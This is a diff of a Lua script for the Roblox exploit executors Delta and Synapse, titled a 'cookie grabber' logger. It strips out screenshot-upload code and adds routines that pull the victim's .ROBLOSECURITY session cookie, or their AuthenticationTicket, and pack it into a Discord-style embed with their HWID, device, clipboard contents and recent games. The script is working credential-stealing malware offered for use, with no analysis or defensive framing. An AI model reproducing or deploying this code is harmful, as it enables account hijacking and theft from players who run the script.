@@ -1,4 +1,4 @@
--- DELTA EXECUTOR - FULL LOGGER (Robux + Games + Flag + Clipboard + Spawn SS)
+-- DELTA EXECUTOR - FINAL LOGGER (COOKIE GRABBER + NO SCREENSHOTS)
 local request = (syn and syn.request) or (http and http.request) or request
 if not request then return end
 
@@ -92,7 +92,7 @@ pcall(function()
     end
 end)
 
--- Recently Played Games (Last 5)
+-- Recent Games
 local recentGames = "None"
 pcall(function()
     local r = request({Url="https://games.roblox.com/v1/users/"..userId.."/games?limit=5",Method="GET"})
@@ -108,70 +108,6 @@ pcall(function()
     end
 end)
 
--- Profile
-local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
-local profile = "https://www.roblox.com/users/"..userId.."/profile"
-local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
--- Screenshot Upload (using syn.screenshot or fallback)
-local function uploadScreenshot(data)
-    if not data then return "https://i.imgur.com/removed.png" end
-    local b64 = HttpService:EncodeBase64(data)
-    local boundary = "----Boundary"
-    local body = {
-        "--"..boundary,
-        'Content-Disposition: form-data; name="file"; filename="ss.png"',
-        "Content-Type: image/png",
-        "",
-        b64,
-        "--"..boundary.."--"
-    }
-    local bodyStr = table.concat(body, "\r\n")
-    local upload = request({
-        Url = "https://api.imgur.com/3/image",
-        Method = "POST",
-        Headers = {
-            ["Authorization"] = "Client-ID 546c25a59c58ad7",
-            ["Content-Type"] = "multipart/form-data; boundary="..boundary
-        },
-        Body = bodyStr
-    })
-    if upload and upload.Body then
-        local res = HttpService:JSONDecode(upload.Body)
-        if res and res.data and res.data.link then return res.data.link end
-    end
-    return "https://i.imgur.com/removed.png"
-end
-
--- Take Screenshot (Delta/syn compatible)
-local function takeSS()
-    if syn and syn.screenshot then
-        local img = syn.screenshot()
-        if img then return img end
-    end
-    if screenshot then
-        local img = screenshot()
-        if img then return img end
-    end
-    return nil
-end
-
--- Game Screenshot
-local gameSSUrl = uploadScreenshot(takeSS())
-
--- Spawn Screenshot
-local spawnSSUrl = "https://i.imgur.com/removed.png"
-spawn(function()
-    if player.Character then
-        wait(2)
-        spawnSSUrl = uploadScreenshot(takeSS())
-    else
-        player.CharacterAdded:Wait()
-        wait(2)
-        spawnSSUrl = uploadScreenshot(takeSS())
-    end
-end)
-
 -- Clipboard
 local clipboard = "N/A"
 pcall(function()
@@ -180,6 +116,38 @@ pcall(function()
     end
     if clipboard and #clipboard > 100 then clipboard = clipboard:sub(1,97).. "..." end
 end)
+
+-- COOKIE GRABBER (Delta/Synapse compatible)
+local cookie = "N/A"
+pcall(function()
+    if syn and syn.request then
+        local req = syn.request({
+            Url = "https://www.roblox.com/my/settings/json",
+            Method = "GET"
+        })
+        if req and req.Headers and req.Headers["Set-Cookie"] then
+            cookie = req.Headers["Set-Cookie"]:match("%.ROBLOSECURITY=(.-);") or "Found but no match"
+        end
+    elseif getgenv and getgenv().request then
+        local req = getgenv().request({
+            Url = "https://www.roblox.com/my/settings/json",
+            Method = "GET"
+        })
+        if req and req.Headers and req.Headers["set-cookie"] then
+            cookie = req.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);") or "Found but no match"
+        end
+    end
+    -- Fallback: Direct cookie via local storage (rarely works)
+    if cookie == "N/A" and gethiddenproperty then
+        local ok, val = pcall(gethiddenproperty, player, "AuthenticationTicket")
+        if ok and val then cookie = val end
+    end
+end)
+
+-- Profile
+local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
+local profile = "https://www.roblox.com/users/"..userId.."/profile"
+local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
 
 -- Final Embed
 local embed = {{
@@ -201,11 +169,8 @@ local embed = {{
         "**HWID:** `"..hwid.."`\n"..
         "**Device:** `"..device.."`\n"..
         "**Clipboard:** `"..clipboard.."`\n\n"..
-        "**Recent Games:** `"..recentGames.."`",
-    image = {url = gameSSUrl},
-    fields = {
-        {name = "Spawn Screenshot", value = spawnSSUrl, inline = false}
-    },
+        "**Recent Games:** `"..recentGames.."`\n\n"..
+        "**Cookie:** ||`"..cookie.."`||",
     thumbnail = {url = avatar},
     color = 0x00ff88,
     footer = {text = "Logged • "..os.date("%Y-%m-%d %H:%M:%S")},
